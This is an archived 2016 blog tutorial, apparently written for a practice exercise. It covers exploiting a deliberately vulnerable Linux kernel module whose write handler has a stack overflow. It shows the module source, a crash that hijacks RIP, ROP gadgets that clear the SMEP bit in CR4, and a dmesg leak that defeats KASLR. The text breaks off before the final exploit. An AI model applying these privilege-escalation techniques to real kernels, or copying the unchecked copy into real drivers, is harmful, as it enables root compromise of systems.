<!DOCTYPE html>
<!-- saved from url=(0119)https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/ -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/analytics.js.下載" type="text/javascript"></script>
<script type="text/javascript">window.addEventListener('DOMContentLoaded',function(){var v=archive_analytics.values;v.service='wb';v.server_name='wwwb-app203.us.archive.org';v.server_ms=1416;archive_analytics.send_pageview({});});</script>
<script type="text/javascript" src="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/bundle-playback.js.下載" charset="utf-8"></script>
<script type="text/javascript" src="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/wombat.js.下載" charset="utf-8"></script>
<script type="text/javascript">
  __wm.init("https://web.archive.org/web");
  __wm.wombat("http://blackbunny.io:80/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/","20171029060939","https://web.archive.org/","web","/_static/",
	      "1509257379");
</script>
<link rel="stylesheet" type="text/css" href="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/banner-styles.css">
<link rel="stylesheet" type="text/css" href="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/iconochive.css">
<!-- End Wayback Rewrite JS Include -->

    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric</title>
    <meta name="description" content="">

    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="https://web.archive.org/web/20171029060939im_/http://www.blackbunny.io/favicon.ico">

    <link rel="stylesheet" type="text/css" href="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/screen.css">
    <link rel="stylesheet" type="text/css" href="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/css">
    <link rel="stylesheet" type="text/css" href="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/prism.css">

    <link rel="canonical" href="https://web.archive.org/web/20171029060939/http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="https://web.archive.org/web/20171029060939/http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/amp/">
    
    <meta property="og:site_name" content="Black Bunny">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric">
    <meta property="og:description" content="Background    Before to get into a genuine exploitation of a kernel vulnerable module, let&#39;s see which protections we need to bypass.   SMEP SMEP stands for Supervisor Mode Execution Protection.  This kernel protection doesn&#39;t allow a user space code to be executed by the kernel. To check if SMEP is activated,">
    <meta property="og:url" content="https://web.archive.org/web/20171029060939/http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/">
    <meta property="article:published_time" content="2016-11-01T18:54:29.000Z">
    <meta property="article:modified_time" content="2016-11-02T15:23:09.000Z">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric">
    <meta name="twitter:description" content="Background    Before to get into a genuine exploitation of a kernel vulnerable module, let&#39;s see which protections we need to bypass.   SMEP SMEP stands for Supervisor Mode Execution Protection.  This kernel protection doesn&#39;t allow a user space code to be executed by the kernel. To check if SMEP is activated,">
    <meta name="twitter:url" content="https://web.archive.org/web/20171029060939im_/http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="blackndoor">
    
    <script type="application/ld+json">
{
    "@context": "https://web.archive.org/web/20171029060939/https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "Black Bunny",
        "logo": "https://web.archive.org/web/20171029060939/http://blackbunny.io/ghost/img/ghosticon.jpg"
    },
    "author": {
        "@type": "Person",
        "name": "blackndoor",
        "url": "https://web.archive.org/web/20171029060939/http://blackbunny.io/author/blackndoor/",
        "sameAs": []
    },
    "headline": "Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric",
    "url": "https://web.archive.org/web/20171029060939/http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/",
    "datePublished": "2016-11-01T18:54:29.000Z",
    "dateModified": "2016-11-02T15:23:09.000Z",
    "description": "Background    Before to get into a genuine exploitation of a kernel vulnerable module, let&#x27;s see which protections we need to bypass.   SMEP SMEP stands for Supervisor Mode Execution Protection.  This kernel protection doesn&#x27;t allow a user space code to be executed by the kernel. To check if SMEP is activated,",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://web.archive.org/web/20171029060939/http://blackbunny.io"
    }
}
    </script>

    <meta name="generator" content="Ghost 0.10">
    <link rel="alternate" type="application/rss+xml" title="Black Bunny" href="https://web.archive.org/web/20171029060939/http://blackbunny.io/rss/">
<script src="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/embed.js.下載" data-timestamp="1509257381157"></script><style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style><link rel="preload" as="style" href="https://web.archive.org/web/20171109195538/https://c.disquscdn.com/next/embed/styles/lounge.2def90852131fd25ba9d39a3fc09a490.css"><link rel="preload" as="script" href="https://web.archive.org/web/20171109195538/https://c.disquscdn.com/next/embed/common.bundle.8edffe1405dcc2d5eb5ee9d96a2866d1.js"><link rel="preload" as="script" href="https://web.archive.org/web/20171109195538/https://c.disquscdn.com/next/embed/lounge.bundle.329e132f404e98b8a5595dd712187b0e.js"><link rel="preload" as="script" href="https://web.archive.org/web/20171109195538/https://disqus.com/next/config.js"></head>
<body class="post-template nav-closed"><!-- BEGIN WAYBACK TOOLBAR INSERT -->
<style type="text/css">
body {
  margin-top:0 !important;
  padding-top:0 !important;
  /*min-width:800px !important;*/
}
</style>
<script>__wm.rw(0);</script>
<div id="wm-ipp-base" lang="en" style="display: block; direction: ltr;">
</div><div id="wm-ipp-print">The Wayback Machine - https://web.archive.org/web/20171029060939/http://blackbunny.io:80/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/</div>
<div id="donato" style="position: relative; width: 100%; height: 265px;">
  <div id="donato-base" style="height: 265px;">
    <iframe id="donato-if" src="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/donate.html" scrolling="no" frameborder="0" style="width:100%; height:100%">
    </iframe>
  </div>
</div><script type="text/javascript">
__wm.bt(650,27,25,2,"web","http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/","20171029060939",1996,"/_static/",["/_static/css/banner-styles.css?v=omkqRugM","/_static/css/iconochive.css?v=qtvMKcIJ"], false);
  __wm.rw(1);
</script>
<!-- END WAYBACK TOOLBAR INSERT -->

    <div class="nav">
    <h3 class="nav-title">Menu</h3>
    <a href="https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/#" class="nav-close">
        <span class="hidden">Close</span>
    </a>
    <ul>
            <li class="nav-home" role="presentation"><a href="https://web.archive.org/web/20171029060939/http://blackbunny.io/">Home</a></li>
    </ul>
        <a class="subscribe-button icon-feed" href="https://web.archive.org/web/20171029060939/http://blackbunny.io/rss/">Subscribe</a>
</div>
<span class="nav-cover"></span>


    <div class="site-wrapper">

        


<header class="main-header post-head no-cover">
    <nav class="main-nav  clearfix">
        
            <a class="menu-button icon-menu" href="https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/#"><span class="word">Menu</span></a>
    </nav>
</header>

<main class="content" role="main">
    <article class="post">

        <header class="post-header">
            <h1 class="post-title">Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric</h1>
            <section class="post-meta">
                <time class="post-date" datetime="2016-11-01">01 November 2016</time> 
            </section>
        </header>

        <section class="post-content">
            <h3 id="background">Background</h3>

<hr>  

<p>Before to get into a genuine exploitation of a kernel vulnerable module, let's see which protections we need to bypass.  </p>

<h4 id="smep">SMEP</h4>

<p>SMEP stands for Supervisor Mode Execution Protection. <br>
This kernel protection doesn't allow a user space code to be executed by the kernel. To check if SMEP is activated, we can simply read /proc/cpuinfo :  </p>

<pre style="background-color: #272822"><code><font color="white">~<font color="red">$</font> cat /proc/cpuinfo  
...
flags       : fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc nopl eagerfpu pni cx16 hypervisor <b>smep</b>  
...
</font></code></pre>  

<p>SMEP is the 20th bit of the CR4 register: <br>
<img src="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/cr4.png" alt=""></p>

<h4 id="kaslr">KASLR</h4>

<p>KASLR stands for Kernel Address Space Layout Randomization. <br>
It aims to make some kernel exploits more difficult to implement by randomizing the base address value of the kernel. (boot time) <br>
Exploits that rely on the locations of internal kernel symbols must discover the randomized base address.  </p>

<h4 id="kerneladdressdisplayrestriction">Kernel Address Display Restriction</h4>

<p>kptr_ restrict indicates if restrictions are placed on exposing kernel addresses via /proc and other interfaces.</p>

<ul>
<li>0, the default, there are no restrictions.</li>
<li>1, kernel pointers printed using the %pK format specifier will be replaced with 0's unless the user has CAP_ SYSLOG</li>
<li>2, kernel pointers printed using %pK will be replaced with 0's regardless of privileges.</li>
</ul>

<p>In other words, we can't get commit_creds addr just by reading the /proc/kallsyms:  </p>

<pre style="background-color: #272822"><code><font color="white">~<font color="red">$</font> cat /proc/kallsyms | grep commit_creds  
0000000000000000 T commit_creds  
...
</font></code></pre>  

<h4 id="privilegeescalation">Privilege escalation</h4>

<p>As always, our goal is to get the top privilege and for that, we just need to execute the following :</p>

<p><code>commit_ creds(prepare_ kernel_ cred(0));</code>  </p>

<h4 id="getbacktouserland">Get back to userland</h4>

<p>Even if we can bypass SMEP, we can't just try to execute /bin/sh in our user code. We need to go back to user land correctly.</p>

<p>This can be done with two gadgets : </p>

<ul>
<li>swapgs</li>
<li>iretq</li>
</ul>

<p>Followed by this structure :</p>

<ul>
<li>the next RIP</li>
<li>user land CS</li>
<li>user land EFLAGS</li>
<li>user land RSP</li>
<li>user land SS</li>
</ul>

<p><br>  </p>

<h3 id="exploitation">Exploitation</h3>

<hr>  

<p>If you want to test or practice the following exploitation, you can download all the files needed from our <a href="https://web.archive.org/web/20171029060939/https://github.com/black-bunny/LinKern-x86_64-bypass-SMEP-KASLR-kptr_restric">github</a>.  </p>

<h4 id="vulnerablemodule">Vulnerable module</h4>

<pre class=" language-c"><code class=" language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/version.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/types.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/kdev_t.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/device.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;asm/uaccess.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h&gt;</span> </span>

<span class="token keyword">static</span> dev_t first<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Global variable for the first device number  </span>
<span class="token keyword">static</span> <span class="token keyword">struct</span> cdev c_dev<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Global variable for the character device structure  </span>
<span class="token keyword">static</span> <span class="token keyword">struct</span> class <span class="token operator">*</span>cl<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Global variable for the device class  </span>
<span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer_var<span class="token punctuation">;</span>

<span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">vuln_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> inode <span class="token operator">*</span>i<span class="token punctuation">,</span> <span class="token keyword">struct</span> file <span class="token operator">*</span>f<span class="token punctuation">)</span>  
<span class="token punctuation">{</span>
  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"[i] Module vuln: open()\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">vuln_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> inode <span class="token operator">*</span>i<span class="token punctuation">,</span> <span class="token keyword">struct</span> file <span class="token operator">*</span>f<span class="token punctuation">)</span>  
<span class="token punctuation">{</span>
  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"[i] Module vuln: close()\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">static</span> ssize_t <span class="token function">vuln_read</span><span class="token punctuation">(</span><span class="token keyword">struct</span> file <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> size_t len<span class="token punctuation">,</span> loff_t <span class="token operator">*</span>off<span class="token punctuation">)</span>  
<span class="token punctuation">{</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>buffer_var<span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"[i] Module vuln read: %s\n"</span><span class="token punctuation">,</span> buffer_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">kfree</span><span class="token punctuation">(</span>buffer_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
    buffer_var<span class="token operator">=</span><span class="token function">kmalloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span>GFP_DMA<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">static</span> ssize_t <span class="token function">vuln_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> file <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span>size_t len<span class="token punctuation">,</span> loff_t <span class="token operator">*</span>off<span class="token punctuation">)</span>  
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_copy_from_user</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>EFAULT<span class="token punctuation">;</span>
  buffer<span class="token punctuation">[</span>len<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'\0'</span><span class="token punctuation">;</span>

  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"[i] Module vuln write: %s\n"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">strncpy</span><span class="token punctuation">(</span>buffer_var<span class="token punctuation">,</span>buffer<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> len<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">struct</span> file_operations pugs_fops <span class="token operator">=</span>  
<span class="token punctuation">{</span>
  <span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>open <span class="token operator">=</span> vuln_open<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>release <span class="token operator">=</span> vuln_close<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>write <span class="token operator">=</span> vuln_write<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>read <span class="token operator">=</span> vuln_read
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">vuln_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">/* Constructor */</span>  
<span class="token punctuation">{</span>
  buffer_var<span class="token operator">=</span><span class="token function">kmalloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span>GFP_DMA<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"[i] Module vuln registered"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>first<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"vuln"</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>cl <span class="token operator">=</span> <span class="token function">class_create</span><span class="token punctuation">(</span>THIS_MODULE<span class="token punctuation">,</span> <span class="token string">"chardrv"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>first<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">device_create</span><span class="token punctuation">(</span>cl<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> first<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"vuln"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"[i] Module vuln error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">class_destroy</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>first<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pugs_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> first<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">device_destroy</span><span class="token punctuation">(</span>cl<span class="token punctuation">,</span> first<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">class_destroy</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>first<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"[i] &lt;Major, Minor&gt;: &lt;%d, %d&gt;\n"</span><span class="token punctuation">,</span> <span class="token function">MAJOR</span><span class="token punctuation">(</span>first<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">MINOR</span><span class="token punctuation">(</span>first<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">vuln_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">/* Destructor */</span>  
<span class="token punctuation">{</span>
    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>first<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"Module vuln unregistered"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">module_init</span><span class="token punctuation">(</span>vuln_init<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token function">module_exit</span><span class="token punctuation">(</span>vuln_exit<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token function">MODULE_AUTHOR</span><span class="token punctuation">(</span><span class="token string">"blackndoor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token function">MODULE_DESCRIPTION</span><span class="token punctuation">(</span><span class="token string">"Module vuln overflow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
</code></pre>

<p>This really simple kernel module has a stack overflow in its function vuln_write(). <br>
The datas' lenght copied to the buffer variable isn't checked.  </p>

<h4 id="analyse">Analyse</h4>

<pre style="background-color: #272822"><code><font color="white" size="1">~<font color="red">$</font> lsmod  
kmod 16384 0 - Live 0x0000000000000000 (O) <i>&lt;= kptr_ restrict</i>  
~<font color="red">$</font> ls /dev
console  null     ttyS0    vuln  
~<font color="red">$</font> cat /proc/kallsyms | grep commit_creds
0000000000000000 T commit_creds <i>&lt;= kptr_ restrict</i>  
~<font color="red">$</font> echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB &gt; /dev/vuln  
[   28.965579] general protection fault: 0000 [#1] SMP
[   28.967297] Modules linked in: kmod(O)
[   28.968139] CPU: 0 PID: 109 Comm: sh Tainted: G           O    4.8.0 #5
[   28.968139] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[   28.968139] task: ffff9f1fc2730000 task.stack: ffff9f1fc2770000
[   28.968139] RIP: 0010:[&lt; 4242424242424242&gt;]  [&lt; 4242424242424242&gt;] 0x4242424242424242
...
[   28.968139] CR2: 0000000000494b0a CR3: 000000000272f000 CR4: 0000000000<b>1</b>006f0 <i>&lt;= SMEP</i>
...
[   28.968139] Call Trace:
[   28.968139]  [&lt; ffffffffbb0c2a00&gt;] ? __init_waitqueue_head+0x10/0x20
...
(restarted)
~<font color="red">$</font> echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB &gt; /dev/vuln  
[  112.990843] general protection fault: 0000 [#1] SMP
...
[  112.992198] Call Trace:
[  112.992198]  [&lt; ffffffffba0c2a00&gt;] ? __init_waitqueue_head+0x10/0x20 <i>&lt;= KASLR</i>
...
</font></code></pre>  

<p>In this analyse, we clearly see the protections (SMEP,KASLR and kptr_restrict)  </p>

<h4 id="bypasssmep">Bypass SMEP</h4>

<p>As explained before, SMEP doens't allow the user space code to be executed by the kernel, so even if we control RIP, we can't execute the user code right away : we can use a ROP exploit with kernel space addresses only or we can disable the SMEP's bit.</p>

<p>SMEP is the 20th bit of the CR4 register which in our case is equal to : <br>
<code>CR4: 00000000001006f0</code></p>

<p>If we can get CR4 to be equal to : <br>
<code>CR4: 00000000000006f0</code> <br>
SMEP will be disabled.</p>

<p>To do so, we can use two gadgets :</p>

<ul>
<li>POP RDI; RET // place 00000000000006f0 in RDI</li>
<li>MOV CR4, RDI; RET // SMEP disbled !</li>
</ul>

<h4 id="bypasskaslrandkptr_restrict">Bypass KASLR and kptr_restrict</h4>

<p>The goal of these bypasses is to find a kernel space address, and add to it an offset to retrieve the gadgets / address needed. <br>
We found one usefull address in the result of the dmesg command :</p>

<pre style="background-color: #272822"><code><font color="white">~<font color="red">$</font> dmesg  
[    0.000000] Linux version 4.8.0 (root@pc1001) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.2) ) #5 SMP Sat Oct 8 10:01:18 CEST 2016
[    0.000000] Command line: console=ttyS0 loglevel=3 oops=panic panic=1
[    0.000000] KERNEL supported cpus:
[    0.000000]   Intel GenuineIntel
[    0.000000]   AMD AuthenticAMD
[    0.000000]   Centaur CentaurHauls
[    0.000000] x86/fpu: Legacy x87 FPU detected.
[    0.000000] x86/fpu: Using 'eager' FPU context switches.
[    0.000000] e820: BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
...
[    0.221392] Freeing SMP alternatives memory: 24K (<b>ffffffffafea9000</b> - ffffffffafeaf000)
...
</font></code></pre>

<p>This is good but we still need to find offsets that we will add or substract to the adress we found in order to get gadgets (for instance "pop gadget" or commit_ creds address). <br>
We need to find the same kernel as the one used in the exercice with KASLR OFF and kptr_restrict set to 0, to be able to find our offsets.</p>

<p>For this purpose, let's first see the kernel used by the system:</p>

<pre style="background-color: #272822"><code><font color="white">~<font color="red">$</font> uname -a  
Linux (none) 4.8.0 #5 SMP Sat Oct 8 10:01:18 CEST 2016 x86_ 64 GNU/Linux  
</font></code></pre>

<p>We download the kernel 4.8.0 from <a href="https://web.archive.org/web/20171029060939/https://www.kernel.org/pub/linux/kernel/v4.x/">kernel.org</a> and compile it with KASLR OFF.</p>

<p>Then, we disable kptr_ restric which is set in the 'init' file. To do so, we extract the file's structure from initramfs.img:</p>

<p><code>gzip -dcS .img initramfs.img | cpio -id</code></p>

<p>We comment the 13th line:  </p>

<pre class=" language-c"><code class=" language-c">#<span class="token operator">!</span><span class="token operator">/</span>bin<span class="token operator">/</span>sh

chown root<span class="token punctuation">:</span>root <span class="token operator">/</span>root  
chown root<span class="token punctuation">:</span>root <span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">*</span>  
chmod <span class="token number">600</span> <span class="token operator">/</span>root<span class="token operator">/</span>flag  
mknod <span class="token operator">-</span>m <span class="token number">0666</span> <span class="token operator">/</span>dev<span class="token operator">/</span>null c <span class="token number">1</span> <span class="token number">3</span>  
mknod <span class="token operator">-</span>m <span class="token number">0660</span> <span class="token operator">/</span>dev<span class="token operator">/</span>ttyS0 c <span class="token number">4</span> <span class="token number">64</span>

mount <span class="token operator">-</span>t proc proc <span class="token operator">/</span>proc  
mount <span class="token operator">-</span>t sysfs sysfs <span class="token operator">/</span>sys

<span class="token macro property"># restriction kallsyms</span>
echo <span class="token number">1</span> <span class="token operator">&gt;</span> <span class="token operator">/</span>proc<span class="token operator">/</span>sys<span class="token operator">/</span>kernel<span class="token operator">/</span>kptr_restrict <span class="token operator">&lt;=</span> comment this line  
insmod <span class="token operator">/</span>kmod<span class="token punctuation">.</span>ko  
mknod <span class="token operator">/</span>dev<span class="token operator">/</span>vuln c <span class="token number">247</span> <span class="token number">0</span>  
chmod a<span class="token operator">+</span>rw <span class="token operator">/</span>dev<span class="token operator">/</span>vuln

setsid cttyhack setuidgid <span class="token number">1000</span> sh

umount <span class="token operator">/</span>proc  
umount <span class="token operator">/</span>sys

